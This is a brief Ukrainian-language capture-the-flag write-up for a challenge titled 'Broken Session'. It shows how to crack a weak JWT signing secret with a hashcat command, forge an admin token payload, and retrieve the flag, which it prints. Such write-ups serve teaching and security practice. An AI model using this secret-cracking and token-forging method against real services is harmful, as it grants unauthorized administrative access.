# Writeup: Flag 2 - Broken Session

1. Авторизуватися через `POST /login` з базовими логіном/паролем `guest:guest`.
2. Отримати JWT токен.
3. Використати `hashcat` або `john` для зламaння секретного ключа JWT:
   `hashcat -m 16500 token.txt -a 0 wordlist.txt` -> ключ `secret123`.
4. Згенерувати новий токен з корисним навантаженням: `{"username": "admin", "role": "internal_admin"}`.
5. Надіслати запит на `GET /admin/flag` з новим токеном у заголовку `Authorization: Bearer <TOKEN>`.
6. Отримати прапор: `CTF{jwt_s3cr3ts_sh0uld_n3v3r_b3_w34k}`.
